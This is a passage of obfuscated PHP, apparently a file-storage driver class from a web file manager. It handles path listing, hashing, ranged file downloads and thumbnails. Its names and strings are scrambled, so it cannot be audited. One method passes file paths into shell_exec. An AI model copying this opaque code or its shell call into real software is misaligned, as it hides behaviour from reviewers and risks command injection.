$Ñ‹ßêË); if (isset($©ÇÓ´ƒÅ[$°Æ¼Ş¥²[79]])) { $³§«ÊÃÓ[$°Æ¼Ş¥²[79]] = $©ÇÓ´ƒÅ[$°Æ¼Ş¥²[79]]; } if (isset($©ÇÓ´ƒÅ[$°Æ¼Ş¥²[88]])) { $³§«ÊÃÓ[$°Æ¼Ş¥²[88]] = $©ÇÓ´ƒÅ[$°Æ¼Ş¥²[88]]; } if (!$Ñ‹ßêË) { $±ÍŒã“[] = $³§«ÊÃÓ; continue; } $±ÍŒã“[] = $³§«ÊÃÓ; $èæ¿ûœ = $©ÇÓ´ƒÅ[$°Æ¼Ş¥²[87]]; $êüŒÉæ  = $this->pathDriver; if (substr($©ÇÓ´ƒÅ[$°Æ¼Ş¥²[87]], 0, strlen($êüŒÉæ )) == $êüŒÉæ ) { $èæ¿ûœ = substr($èæ¿ûœ, strlen($êüŒÉæ )); } $this->listAllMake($èæ¿ûœ, $±ÍŒã“); } } public function listAllSimple($æÊçÈ¹, $À£Ò³Ë = false) { $¹¦„³õÅ = $this->listAll($æÊçÈ¹); return $this->listAllSimpleMake($¹¦„³õÅ, $this->getPathOuter($æÊçÈ¹), $À£Ò³Ë); } public function listAllSimpleMake($ò®¿™‚Æ, $Êáİ·•ì, $ü‚±óÜ½) { $şÉ­Îø =& $_SERVER[Ùæõ‰Ï’]; $­¿›¨º  = array(); $Êáİ·•ì = rtrim(get_path_father($Êáİ·•ì), $şÉ­Îø[8]) . $şÉ­Îø[8]; foreach ($ò®¿™‚Æ as $áŞ‘µ™°) { $Ü‰ãÓº = array($şÉ­Îø[87] => $áŞ‘µ™°[$şÉ­Îø[87]], $şÉ­Îø[89] => $áŞ‘µ™°[$şÉ­Îø[87]], $şÉ­Îø[78] => $áŞ‘µ™°[$şÉ­Îø[78]]); if (isset($áŞ‘µ™°[$şÉ­Îø[79]]) && !$áŞ‘µ™°[$şÉ­Îø[78]]) { $Ü‰ãÓº[$şÉ­Îø[79]] = $áŞ‘µ™°[$şÉ­Îø[79]]; } if (isset($áŞ‘µ™°[$şÉ­Îø[88]])) { $Ü‰ãÓº[$şÉ­Îø[88]] = $áŞ‘µ™°[$şÉ­Îø[88]]; } if (is_array($áŞ‘µ™°[$şÉ­Îø[90]])) { $Ü‰ãÓº[$şÉ­Îø[89]] = $áŞ‘µ™°[$şÉ­Îø[90]][$şÉ­Îø[87]]; $Ü‰ãÓº[$şÉ­Îø[79]] = $áŞ‘µ™°[$şÉ­Îø[90]][$şÉ­Îø[79]]; $Ü‰ãÓº[$şÉ­Îø[88]] = $áŞ‘µ™°[$şÉ­Îø[90]][$şÉ­Îø[88]]; } else { if (substr($áŞ‘µ™°[$şÉ­Îø[87]], 0, strlen($Êáİ·•ì)) == $Êáİ·•ì) { $Ü‰ãÓº[$şÉ­Îø[87]] = substr($áŞ‘µ™°[$şÉ­Îø[87]], strlen($Êáİ·•ì)); } } $¢í‡œ…ª = $áŞ‘µ™°[$şÉ­Îø[78]] ? $şÉ­Îø[8] : $şÉ­Îø[12]; $Ü‰ãÓº[$şÉ­Îø[89]] = rtrim($Ü‰ãÓº[$şÉ­Îø[89]], $şÉ­Îø[8]) . $¢í‡œ…ª; $Ü‰ãÓº[$şÉ­Îø[87]] = $şÉ­Îø[8] . trim($Ü‰ãÓº[$şÉ­Îø[87]], $şÉ­Îø[8]) . $¢í‡œ…ª; if (!$ü‚±óÜ½) { $›ûÇ„öª = explode($şÉ­Îø[8], trim($Ü‰ãÓº[$şÉ­Îø[87]], $şÉ­Îø[8])); $Ü‰ãÓº[$şÉ­Îø[87]] = $şÉ­Îø[8] . implode($şÉ­Îø[8], array_slice($›ûÇ„öª, 1)) . $¢í‡œ…ª; } $­¿›¨º [] = $Ü‰ãÓº; } return array_sort_by($­¿›¨º , $şÉ­Îø[87]); } public function upload($‡ö¡î’Õ, $°‡¾ï†é, $Ö±Úğ‹ = false, $ã‡ ¬ = REPEAT_REPLACE) { } public function uploadFileByID($ÌË‡äç, $«»ò½–Ÿ, $²½Ğ¶Ã™) { } public function uploadFileByPath($·ı÷¶ğ«, $Ëæª–æ, $¡š¥ºĞƒ = array()) { } public function isUploadServer() { $äí°ğ‘ı =& $_SERVER[Ùæõ‰Ï’]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $äí°ğ‘ı[91]) { return !0; } return $GLOBALS[$äí°ğ‘ı[6]][$äí°ğ‘ı[92]][$äí°ğ‘ı[93]]; } public function isFileOutServer() { $„¼¶Äş· =& $_SERVER[Ùæõ‰Ï’]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $„¼¶Äş·[91]) { return !0; } return $GLOBALS[$„¼¶Äş·[6]][$„¼¶Äş·[92]][$„¼¶Äş·[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($˜’äßç) { $Äƒèïú =& $_SERVER[Ùæõ‰Ï’]; if (!$this->isCdnHost()) { return $˜’äßç; } return str_replace(trim(get_url_root($˜’äßç), $Äƒèïú[8]), trim($this->cdnHost, $Äƒèïú[8]), $˜’äßç); } public function uploadLink($ö•—³¶, $ÛÛ¬„£ò = 0) { $æƒÄÎÏ› =& $_SERVER[Ùæõ‰Ï’]; if ($this->isUploadServer()) { return; } $ÄüÕÉğ = $this->getType(); if (!in_array($ÄüÕÉğ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ÛåÓ¦ÆÂ = 1024 * 1024 * 10; $Óğ¤Ï¾İ = $ÛÛ¬„£ò <= $ÛåÓ¦ÆÂ ? $æƒÄÎÏ›[95] : $æƒÄÎÏ›[96]; $Íıˆ®ö­ = (!$ÛÛ¬„£ò ? 1 : ceil($ÛÛ¬„£ò / pow(1024, 3))) * 3600 * 4; $È¯ÉÎ‰ë = $this->{$Óğ¤Ï¾İ}($ö•—³¶, $Íıˆ®ö­); if ($È¯ÉÎ‰ë) { $È¯ÉÎ‰ë[$æƒÄÎÏ›[97]] = $ö•—³¶; $È¯ÉÎ‰ë[$æƒÄÎÏ›[98]] = $ÄüÕÉğ; } return $È¯ÉÎ‰ë; } public function uploadFormData($ÛõŒÂ¼, $Ã“¼ÊÇİ = 3600) { } public function multiUploadFormData($çşÚ¦²¿, $”óŠø½‡ = 3600) { } public function download($ëÊí¸—ƒ, $™Ü—˜¦Ë) { } public function ext($¿¥›¯É) { $’ğüÒ•ä =& $_SERVER[Ùæõ‰Ï’]; if (strpos($¿¥›¯É, $’ğüÒ•ä[8]) === -1) { $ªÂó ·ß = $¿¥›¯É; } else { $ªÂó ·ß = $this->pathThis($¿¥›¯É); } $î¯˜…©Ğ = $’ğüÒ•ä[12]; if (strstr($ªÂó ·ß, $’ğüÒ•ä[10])) { $î¯˜…©Ğ = substr($ªÂó ·ß, strrpos($ªÂó ·ß, $’ğüÒ•ä[10]) + 1); $î¯˜…©Ğ = strtolower($î¯˜…©Ğ); } if (strlen($î¯˜…©Ğ) > 3 && preg_match($’ğüÒ•ä[99], $î¯˜…©Ğ, $­ÏåëÒ)) { $î¯˜…©Ğ = $’ğüÒ•ä[12]; } return $î¯˜…©Ğ; } public function pathThis($—¨´ûó») { $ò•º¹šŸ =& $_SERVER[Ùæõ‰Ï’]; $—¨´ûó» = str_replace($ò•º¹šŸ[100], $ò•º¹šŸ[8], rtrim($—¨´ûó», $ò•º¹šŸ[8])); $„«ç«ğ‡ = strrpos($—¨´ûó», $ò•º¹šŸ[8]); if ($„«ç«ğ‡ === !1) { return $—¨´ûó»; } return substr($—¨´ûó», $„«ç«ğ‡ + 1); } public function pathFather($¶±…îÓ) { $ÀÇ˜ùçƒ =& $_SERVER[Ùæõ‰Ï’]; $¶±…îÓ = str_replace($ÀÇ˜ùçƒ[100], $ÀÇ˜ùçƒ[8], rtrim($¶±…îÓ, $ÀÇ˜ùçƒ[8])); $¯ñÁê­Á = strrpos($¶±…îÓ, $ÀÇ˜ùçƒ[8]); if ($¯ñÁê­Á === !1) { return $ÀÇ˜ùçƒ[12]; } return substr($¶±…îÓ, 0, $¯ñÁê­Á + 1); } public function hashSimple($ğÑ®¹±Ó) { $ÊÌÄ÷Óö =& $_SERVER[Ùæõ‰Ï’]; if (!$ğÑ®¹±Ó) { return md5($ÊÌÄ÷Óö[12]); } $ó€ÌÍ¢¯ = $this->size($ğÑ®¹±Ó); $úÎˆİ”ä = 200; $´¿·ÈÔš = 50; if ($ó€ÌÍ¢¯ <= $úÎˆİ”ä * $´¿·ÈÔš) { return $this->hashMd5($ğÑ®¹±Ó) . $ó€ÌÍ¢¯; } $Ûïú¢šæ = intval($ó€ÌÍ¢¯ / $´¿·ÈÔš); $óùÁ‚ƒ = $ÊÌÄ÷Óö[12]; for ($ŸÍ°ˆœü = 0; $ŸÍ°ˆœü < $´¿·ÈÔš; $ŸÍ°ˆœü++) { $óùÁ‚ƒ .= $this->fileSubstr($ğÑ®¹±Ó, $Ûïú¢šæ * $ŸÍ°ˆœü, $úÎˆİ”ä); } $óùÁ‚ƒ .= $this->fileSubstr($ğÑ®¹±Ó, $ó€ÌÍ¢¯ - $úÎˆİ”ä, $úÎˆİ”ä); return md5($óùÁ‚ƒ) . $ó€ÌÍ¢¯; } public static $md5Cache = array(); public function hashMd5($™­·ˆñ¿) { if (!$™­·ˆñ¿) { return md5($_SERVER[Ùæõ‰Ï’][12]); } $™­·ˆñ¿ = $this->iconvSystem($™­·ˆñ¿); if (isset(self::$md5Cache[$™­·ˆñ¿])) { return self::$md5Cache[$™­·ˆñ¿]; } self::$md5Cache[$™­·ˆñ¿] = $this->hashMd5Shell($™­·ˆñ¿); if (!self::$md5Cache[$™­·ˆñ¿]) { self::$md5Cache[$™­·ˆñ¿] = @md5_file($™­·ˆñ¿); } return self::$md5Cache[$™­·ˆñ¿]; } private function hashMd5Shell($Ã­™«á) { $Â£™šìÑ =& $_SERVER[Ùæõ‰Ï’]; if (!$Ã­™«á) { return md5($Â£™šìÑ[12]); } if (!function_exists($Â£™šìÑ[101])) { return !1; } $‡‚µ©Å = array($Â£™šìÑ[102], $Â£™šìÑ[103]); $¼¥Ã©Ûá = Cache::get($Â£™šìÑ[104]); if (!$¼¥Ã©Ûá) { $ÙÂêÖŸ¼ = BASIC_PATH . $Â£™šìÑ[105]; $¥‰¡ƒõ = md5_file($ÙÂêÖŸ¼); $¼¥Ã©Ûá = $Â£™šìÑ[106]; foreach ($‡‚µ©Å as $Ç–¼¡À) { $şıÆöøï = shell_exec($Ç–¼¡À . "\x20\x22{$ÙÂêÖŸ¼}\42"); if ($şıÆöøï && substr(trim($şıÆöøï), 0, 32) == $¥‰¡ƒõ) { $¼¥Ã©Ûá = $Ç–¼¡À; break; } } Cache::set($Â£™šìÑ[104], $¼¥Ã©Ûá, 3600); } if ($¼¥Ã©Ûá == $Â£™šìÑ[106]) { return !1; } $şıÆöøï = shell_exec($¼¥Ã©Ûá . "\x20\x22{$Ã­™«á}\x22"); $şıÆöøï = str_replace($Â£™šìÑ[107], $Â£™šìÑ[12], $şıÆöøï); return substr($şıÆöøï, 0, 32); } public function link($Æé£ÕĞë) { return $Æé£ÕĞë; } public function fileOut($ô´—’¡µ, $ÂÚÕĞ©… = false, $ôºÂÎ¹¸ = false, $Î€¬˜Õœ = '') { $Æ‰ŒÊ½‹ =& $_SERVER[Ùæõ‰Ï’]; $this->cacheMethod(null, null); if (!$ô´—’¡µ || !$this->exist($ô´—’¡µ)) { show_json(LNG($Æ‰ŒÊ½‹[108]), !1, $ôºÂÎ¹¸); } $ˆñÆ¢Óâ = $this->getType() == $Æ‰ŒÊ½‹[109]; $¶´Ä–õ = $GLOBALS[$Æ‰ŒÊ½‹[6]][$Æ‰ŒÊ½‹[92]][$Æ‰ŒÊ½‹[110]][$Æ‰ŒÊ½‹[111]]; $Ç½·”Öï = (double) $GLOBALS[$Æ‰ŒÊ½‹[6]][$Æ‰ŒÊ½‹[92]][$Æ‰ŒÊ½‹[110]][$Æ‰ŒÊ½‹[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $™¸ØèÔÓ = $this->infoFull($ô´—’¡µ); $ÏŞ€åƒ– = $™¸ØèÔÓ[$Æ‰ŒÊ½‹[79]]; $½¨¹¦¯ = gmdate($Æ‰ŒÊ½‹[113], $™¸ØèÔÓ[$Æ‰ŒÊ½‹[88]]); $ç õ‘øÜ = $ôºÂÎ¹¸ ? $ôºÂÎ¹¸ : $this->iconvApp($™¸ØèÔÓ[$Æ‰ŒÊ½‹[32]]); $³åù¡Æ = 0; $ÈÈ†¶å = $ÏŞ€åƒ– - 1; $èã¤¾œ± = $this->ext($ç õ‘øÜ); if (in_array($èã¤¾œ±, array($Æ‰ŒÊ½‹[114], $Æ‰ŒÊ½‹[115], $Æ‰ŒÊ½‹[116], $Æ‰ŒÊ½‹[117]))) { $èã¤¾œ± = $Æ‰ŒÊ½‹[118]; } if (in_array($èã¤¾œ±, array($Æ‰ŒÊ½‹[119]))) { $èã¤¾œ± = $Æ‰ŒÊ½‹[120]; } if (!$Î€¬˜Õœ) { $Î€¬˜Õœ = md5($½¨¹¦¯ . $ÏŞ€åƒ–); } $Î€¬˜Õœ = $Æ‰ŒÊ½‹[121] . $Î€¬˜Õœ . $Æ‰ŒÊ½‹[121]; $şˆ•¦óì = get_file_mime($èã¤¾œ±); $ë—ºÀ¸û = !0; $ë—ºÀ¸û = isset($_GET[$Æ‰ŒÊ½‹[122]]) ? !1 : !0; if ($ÂÚÕĞ©… === !1 && !mime_support($şˆ•¦óì)) { $şˆ•¦óì = $Æ‰ŒÊ½‹[123]; } header($Æ‰ŒÊ½‹[124]); header($Æ‰ŒÊ½‹[125] . $şˆ•¦óì); $¨åß“Àİ = rawurlencode($ç õ‘øÜ); $¨åß“Àİ = $Æ‰ŒÊ½‹[121] . $¨åß“Àİ . $Æ‰ŒÊ½‹[126] . $¨åß“Àİ; if ($ÂÚÕĞ©…) { header($Æ‰ŒÊ½‹[127]); header($Æ‰ŒÊ½‹[128] . $¨åß“Àİ); } else { if ($ë—ºÀ¸û) { header($Æ‰ŒÊ½‹[129] . $¨åß“Àİ); } } $”¦õ°æé = 3600 * 24 * 30; header($Æ‰ŒÊ½‹[130]); header($Æ‰ŒÊ½‹[131]); header($Æ‰ŒÊ½‹[132] . $”¦õ°æé); header($Æ‰ŒÊ½‹[133] . gmdate($Æ‰ŒÊ½‹[113], time() + $”¦õ°æé) . $Æ‰ŒÊ½‹[134]); if (isset($_SERVER[$Æ‰ŒÊ½‹[135]]) && strtotime($_SERVER[$Æ‰ŒÊ½‹[135]]) == $™¸ØèÔÓ[$Æ‰ŒÊ½‹[88]]) { header($Æ‰ŒÊ½‹[136], !0, 304); die; } if (isset($_SERVER[$Æ‰ŒÊ½‹[137]]) && $_SERVER[$Æ‰ŒÊ½‹[137]] == $Î€¬˜Õœ) { header($Æ‰ŒÊ½‹[138] . $Î€¬˜Õœ, !0, 304); die; } header($Æ‰ŒÊ½‹[138] . $Î€¬˜Õœ); header($Æ‰ŒÊ½‹[139] . $½¨¹¦¯ . $Æ‰ŒÊ½‹[134]); header($Æ‰ŒÊ½‹[140] . $ç õ‘øÜ); header($Æ‰ŒÊ½‹[141]); header($Æ‰ŒÊ½‹[142] . $ÏŞ€åƒ–); header($Æ‰ŒÊ½‹[143]); Hook::trigger($Æ‰ŒÊ½‹[144], $ô´—’¡µ, $ÏŞ€åƒ–, $ç õ‘øÜ, $èã¤¾œ±); if (!$ÂÚÕĞ©… && $èã¤¾œ± == $Æ‰ŒÊ½‹[145]) { if ($ÏŞ€åƒ– > 1024 * 1024 * 5) { die; } $µØØöù© = $this->getContent($ô´—’¡µ); $µØØöù© = Html::clearSVG($µØØöù©); header($Æ‰ŒÊ½‹[146] . strlen($µØØöù©)); echo $µØØöù©; die; } $éŠ‚•ğ˜ = strtolower($_SERVER[$Æ‰ŒÊ½‹[147]]); if ($ˆñÆ¢Óâ && $éŠ‚•ğ˜ && $¶´Ä–õ) { if (strstr($éŠ‚•ğ˜, $Æ‰ŒÊ½‹[148])) { header($Æ‰ŒÊ½‹[149] . $ô´—’¡µ); } else { if (strstr($éŠ‚•ğ˜, $Æ‰ŒÊ½‹[150])) { header($Æ‰ŒÊ½‹[151] . $ô´—’¡µ); } else { if (strstr($éŠ‚•ğ˜, $Æ‰ŒÊ½‹[152])) { header($Æ‰ŒÊ½‹[153] . $ô´—’¡µ); } } } if ($Ç½·”Öï) { header($Æ‰ŒÊ½‹[154] . $Ç½·”Öï); } return; } if (isset($_SERVER[$Æ‰ŒÊ½‹[155]])) { if (preg_match($Æ‰ŒÊ½‹[156], $_SERVER[$Æ‰ŒÊ½‹[155]], $È‚Íµ±Ò)) { $³åù¡Æ = intval($È‚Íµ±Ò[1]); $³åù¡Æ = $³åù¡Æ <= 0 ? 0 : ($³åù¡Æ >= $ÈÈ†¶å ? $ÈÈ†¶å : $³åù¡Æ); if (!empty($È‚Íµ±Ò[2])) { $éà€çúÕ = intval($È‚Íµ±Ò[2]); $ÈÈ†¶å = $éà€çúÕ < $³åù¡Æ ? $³åù¡Æ : ($éà€çúÕ >= $ÈÈ†¶å ? $ÈÈ†¶å : $éà€çúÕ); } } header($Æ‰ŒÊ½‹[157]); header("\103\x6f\x6e\164\x65\156\164\55\x52\x61\156\147\145\72\x20\142\171\x74\x65\163\x20{$³åù¡Æ}\x2d{$ÈÈ†¶å}\x2f" . $ÏŞ€åƒ–); } else { header($Æ‰ŒÊ½‹[158]); } header($Æ‰ŒÊ½‹[159]); header($Æ‰ŒÊ½‹[160]); $†áïä…¯ = !0; if ($_SERVER[$Æ‰ŒÊ½‹[161]] == $Æ‰ŒÊ½‹[162] && $ÏŞ€åƒ– > 1204 * 1024 * 1024 * 2) { $†áïä…¯ = !1; } if ($†áïä…¯) { header($Æ‰ŒÊ½‹[163] . ($ÈÈ†¶å - $³åù¡Æ + 1)); } if ($_SERVER[$Æ‰ŒÊ½‹[164]] == $Æ‰ŒÊ½‹[165]) { return; } $¬ëŸ™³Ò = array($Æ‰ŒÊ½‹[166] => !1, $Æ‰ŒÊ½‹[167] => $³åù¡Æ, $Æ‰ŒÊ½‹[168] => $ÈÈ†¶å, $Æ‰ŒÊ½‹[169] => $èã¤¾œ±, $Æ‰ŒÊ½‹[170] => $™¸ØèÔÓ, $Æ‰ŒÊ½‹[171] => $Æ‰ŒÊ½‹[12], $Æ‰ŒÊ½‹[172] => 0); $¬ëŸ™³Ò = Hook::filter($Æ‰ŒÊ½‹[173], $¬ëŸ™³Ò); $¼¢á·Ù = 1024 * 300; $¯„ïóŠ = 0; if ($Ç½·”Öï) { $¯„ïóŠ = intval(1000 * 1000 * ($¼¢á·Ù / $Ç½·”Öï)); } while ($³åù¡Æ <= $ÈÈ†¶å) { $ãğä´–Ç = timeFloat(); check_abort(); $ª¸ÈË¸ = $ÈÈ†¶å - $³åù¡Æ + 1; if ($ª¸ÈË¸ <= $¼¢á·Ù) { $¼¢á·Ù = $ª¸ÈË¸; } $µØØöù© = $this->fileSubstr($ô´—’¡µ, $³åù¡Æ, $¼¢á·Ù); if ($¬ëŸ™³Ò[$Æ‰ŒÊ½‹[166]]) { $¬ëŸ™³Ò[$Æ‰ŒÊ½‹[171]] = $µØØöù©; $¬ëŸ™³Ò[$Æ‰ŒÊ½‹[172]] = $³åù¡Æ; $¬ëŸ™³Ò = Hook::filter($Æ‰ŒÊ½‹[174], $¬ëŸ™³Ò); $µØØöù© = $¬ëŸ™³Ò[$Æ‰ŒÊ½‹[171]]; } echo $µØØöù©; $³åù¡Æ += $¼¢á·Ù; if ($¼¢á·Ù == $ª¸ÈË¸) { $³åù¡Æ = $ÈÈ†¶å + 1; } if ($¯„ïóŠ) { $£Ôè—Æ± = intval(1000 * 1000 * (timeFloat() - $ãğä´–Ç)); $ˆšÂ‚ = $¯„ïóŠ - $£Ôè—Æ±; if ($ˆšÂ‚ > 5) { usleep($ˆšÂ‚); } } } } public function fileOutServer($ÉÍªª¼¦, $æ‡ëãí‘ = false, $Ö×ª³— = false, $‘Ø©Å„æ = '') { $this->fileOut($ÉÍªª¼¦, $æ‡ëãí‘, $Ö×ª³—, $‘Ø©Å„æ); } public function fileOutLink($ÂÓïò´ğ) { header($_SERVER[Ùæõ‰Ï’][175] . $ÂÓïò´ğ); die; } public function cacheMethod($£›½ìÊ¢, $ğ¡éàï…, $ˆÍ—¤‹… = null) { $º¢üšš =& $_SERVER[Ùæõ‰Ï’]; static $çıóÀş÷ = array(); $Šşº…ìë = $ğ¡éàï… ? ltrim($this->getPathOuter($ğ¡éàï…), $º¢üšš[8]) : $º¢üšš[12]; $ËÓº£¹Ğ = $º¢üšš[176] . $£›½ìÊ¢ . $º¢üšš[177] . rtrim($Šşº…ìë, $º¢üšš[8]); if (is_null($£›½ìÊ¢)) { $çıóÀş÷ = array(); return; } if (is_null($ğ¡éàï…)) { foreach ($çıóÀş÷ as $ËÓº£¹Ğ => $û­ëà‹˜) { if (!strstr($ËÓº£¹Ğ, $º¢üšš[176] . $£›½ìÊ¢ . $º¢üšš[178])) { continue; } unset($çıóÀş÷[$ËÓº£¹Ğ]); } return; } if (!is_null($ˆÍ—¤‹…)) { $çıóÀş÷[$ËÓº£¹Ğ] = $ˆÍ—¤‹…; return; } $ÂºïŞ¸Ô = isset($çıóÀş÷[$ËÓº£¹Ğ]) ? $çıóÀş÷[$ËÓº£¹Ğ] : null; if (!is_null($ÂºïŞ¸Ô)) { return $ÂºïŞ¸Ô; } $ÂºïŞ¸Ô = $this->{$£›½ìÊ¢}($ğ¡éàï…); $çıóÀş÷[$ËÓº£¹Ğ] = $ÂºïŞ¸Ô; return $ÂºïŞ¸Ô; } public function cacheMethodInfoSet($ºÆ¸¯æ, $¸¥«ÑÅ, $¤Íá„Áí = false) { $üÏ ÓıÒ =& $_SERVER[Ùæõ‰Ï’]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($üÏ ÓıÒ[179], $ºÆ¸¯æ, $¸¥«ÑÅ); $this->cacheMethod($üÏ ÓıÒ[180], $ºÆ¸¯æ, $¸¥«ÑÅ ? !1 : !0); if (is_array($¤Íá„Áí)) { $this->cacheMethod($üÏ ÓıÒ[181], $ºÆ¸¯æ, $¤Íá„Áí); } } public function fileOutImage($©¦‹²ˆÆ, $¼¼à×º = 250) { $øøöôƒş =& $_SERVER[Ùæõ‰Ï’]; set_timeout(); if (substr($©¦‹²ˆÆ, 0, 4) == $øøöôƒş[152]) { $this->fileOutLink($©¦‹²ˆÆ); } $¹€ß™³— = $this->info($©¦‹²ˆÆ); $‹ ›Ä‰ = !1; $ÉÔãôöê = isset($GLOBALS[$øøöôƒş[182]]) ? $GLOBALS[$øøöôƒş[182]] : array(); if ($ÉÔãôöê && $ÉÔãôöê[$øøöôƒş[183]] == $¹€ß™³—[$øøöôƒş[87]]) { $¹€ß™³— = $ÉÔãôöê; $®àµÙê = $¹€ß™³—[$øøöôƒş[184]]; if ($®àµÙê && isset($®àµÙê[$øøöôƒş[185]])) { if ($®àµÙê[$øøöôƒş[185]] <= $¼¼à×º && $®àµÙê[$øøöôƒş[186]] <= $¼¼à×º) { $‹ ›Ä‰ = !0; } } } if ($¹€ß™³—[$øøöôƒş[79]] <= 1024 * 50 || $‹ ›Ä‰ || !function_exists($øøöôƒş[187]) || $¹€ß™³—[$øøöôƒş[169]] == $øøöôƒş[188]) { return $this->fileOut($©¦‹²ˆÆ, !1, $¹€ß™³—[$øøöôƒş[32]]); } $œ³ÆÇ›» = kodIO::hashPath($¹€ß™³—); $³úËÊŞû = "\143\157\166\145\x72\x5f{$œ³ÆÇ›»}\137{$¼¼à×º}\x2e\x70\156\147"; $ÄÅÉãï = IO_PATH_SYSTEM_TEMP . $øøöôƒş[189]; $³¢øßœ¸ = IO::infoFullSimple($ÄÅÉãï); $§•æµöŸ = $³¢øßœ¸ && is_array($³¢øßœ¸) ? $³¢øßœ¸[$øøöôƒş[87]] : $øøöôƒş[12]; if (!$§•æµöŸ) { $§•æµöŸ = IO::mkdir($ÄÅÉãï); } if ($¹€ß™³—[$øøöôƒş[190]] == $øøöôƒş[191] && isset($¹€ß™³—[$øøöôƒş[192]]) && $¹€ß™³—[$øøöôƒş[192]] == kodIO::sourceID($§•æµöŸ)) { $›çş±” = $¹€ß™³—[$øøöôƒş[193]]; if ($¼¼à×º <= 500) { $’¼©™º¤ = preg_replace($øøöôƒş[194], $øøöôƒş[195], $¹€ß™³—[$øøöôƒş[32]]); $›çş±” = IO::fileNameExist($§•æµöŸ, $’¼©™º¤); } return IO::fileOut(KodIO::make($›çş±”), !1, $¹€ß™³—[$øøöôƒş[32]]); } $º‡­€Æ = IO::fileNameExist($§•æµöŸ, $³úËÊŞû); if ($º‡­€Æ) { return IO::fileOut(KodIO::make($º‡­€Æ), !1, $¹€ß™³—[$øøöôƒş[32]]); } if ($¼¼à×º > 1000) { $this->makeImageCover($§•æµöŸ, $©¦‹²ˆÆ, $³úËÊŞû, $¼¼à×º); $this->makeImageCover($§•æµöŸ, $©¦‹²ˆÆ, "\143\x6f\166\x65\162\x5f{$œ³ÆÇ›»}\137\62\65\60\56\x70\x6e\x67", 250); $º‡­€Æ = IO::fileNameExist($§•æµöŸ, $³úËÊŞû); if ($º‡­€Æ) { return IO::fileOut(KodIO::make($º‡­€Æ), !1, $¹€ß™³—[$øøöôƒş[32]]); } die; } $ª¦äÑ€ù = Cache::get($³úËÊŞû); if ($ª¦äÑ€ù == $øøöôƒş[196] || $ª¦äÑ€ù == $øøöôƒş[197]) { echo $ª¦äÑ€ù; die; } Cache::set($³úËÊŞû, $øøöôƒş[197], 60); $¸ã¦ø… = array($§•æµöŸ, $¹€ß™³—[$øøöôƒş[87]], $³úËÊŞû, $¼¼à×º); $«³Ù‰ÍÜ = $øøöôƒş[198] . $¹€ß™³—[$øøöôƒş[79]] . $øøöôƒş[199] . $³úËÊŞû . $øøöôƒş[200] . $¹€ß™³—[$øøöôƒş[32]] . $øøöôƒş[201] . $¹€ß™³—[$øøöôƒş[87]]; TaskQueue::add($øøöôƒş[202], $¸ã¦ø…, $«³Ù‰ÍÜ, $³úËÊŞû); } public function makeImageCover($õ¯Â«ÕÂ, $ğ«É½‘†, $ßÙÕÎÓŒ, $Ğ½ÂëæÅ) { $Ù“•·…½ =& $_SERVER[Ùæõ‰Ï’]; if (IO::fileNameExist($õ¯Â«ÕÂ, $ßÙÕÎÓŒ)) { return $Ù“•·…½[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ª€‡–ê® = DATA_THUMB . $ßÙÕÎÓŒ; del_file($ª€‡–ê®); $’•ºùŞÚ = TEMP_FILES . $ßÙÕÎÓŒ; if (!@file_exists($’•ºùŞÚ)) { $’•ºùŞÚ = $this->download($ğ«É½‘†, $’•ºùŞÚ); } if (!@file_exists($’•ºùŞÚ)) { return $Ù“•·…½[204]; } ImageThumb::createThumb($’•ºùŞÚ, $ª€‡–ê®, $Ğ½ÂëæÅ, $Ğ½ÂëæÅ * 10); if (@file_exists($ª€‡–ê®)) { Cache::remove($ßÙÕÎÓŒ); return IO::move($ª€‡–ê®, $õ¯Â«ÕÂ); } Cache::set($ßÙÕÎÓŒ, $Ù“•·…½[196], 600); del_file($ª€‡–ê®); return $Ù“•·…½[205] . $’•ºùŞÚ . $Ù“•·…½[74]; } public function fileOutImageServer($¹Ğİ‘Àß, $ƒø§ŞÛ = 250) { $this->fileOutImage($¹Ğİ‘Àß, $ƒø§ŞÛ); } public function fileNameAuto($æÅÃèÅ, $¿‡ ƒç…, $õ×Í™íÜ = REPEAT_RENAME, $ŒµíåÏ‹ = false) { $Ù”öä =& $_SERVER[Ùæõ‰Ï’]; $´ü½Î = $æÅÃèÅ === $Ù”öä[12] ? $¿‡ ƒç… : rtrim($æÅÃèÅ, $Ù”öä[8]) . $Ù”öä[8] . $¿‡ ƒç…; if ($õ×Í™íÜ == REPEAT_REPLACE || !$this->exist($´ü½Î) || $ŒµíåÏ‹ && $õ×Í™íÜ != REPEAT_RENAME_FOLDER) { return $¿‡ ƒç…; } if ($õ×Í™íÜ == REPEAT_SKIP) { return !1; } $ÈËùÌ“Í = $Ù”öä[10] . get_path_ext($¿‡ ƒç…); $ÈËùÌ“Í = $ÈËùÌ“Í == $Ù”öä[10] || $ŒµíåÏ‹ ? $Ù”öä[12] : $ÈËùÌ“Í; $øúĞ‹õø = 1; $Œ½¸ĞÚĞ = substr($¿‡ ƒç…, 0, strlen($¿‡ ƒç…) - strlen($ÈËùÌ“Í)); $Ø¶Èíø = $Œ½¸ĞÚĞ . "\x28{$øúĞ‹õø}\51{$ÈËùÌ“Í}"; while ($this->exist(rtrim($æÅÃèÅ, $Ù”öä[8]) . $Ù”öä[8] . $Ø¶Èíø)) { $Ø¶Èíø = $Œ½¸ĞÚĞ . "\50{$øúĞ‹õø}\51{$ÈËùÌ“Í}"; $øúĞ‹õø++; } return $Ø¶Èíø; } private function fileNameAutoList($ñàòƒÃÙ, $æÚÖí, $¹›û¯œß = false) { $Ï§šø“ =& $_SERVER[Ùæõ‰Ï’]; $èÒ¤³ë‰ = $this->listPath($ñàòƒÃÙ, !0); $èÒ¤³ë‰ = array_merge($èÒ¤³ë‰[$Ï§šø“[85]], $èÒ¤³ë‰[$Ï§šø“[86]]); $õ†‹†Ñ = array_to_keyvalue($èÒ¤³ë‰, $Ï§šø“[12], $Ï§šø“[32]); $Ğ²™èÖ‡ = $Ï§šø“[10] . get_path_ext($æÚÖí); $Ğ²™èÖ‡ = $Ğ²™èÖ‡ == $Ï§šø“[10] || $¹›û¯œß ? 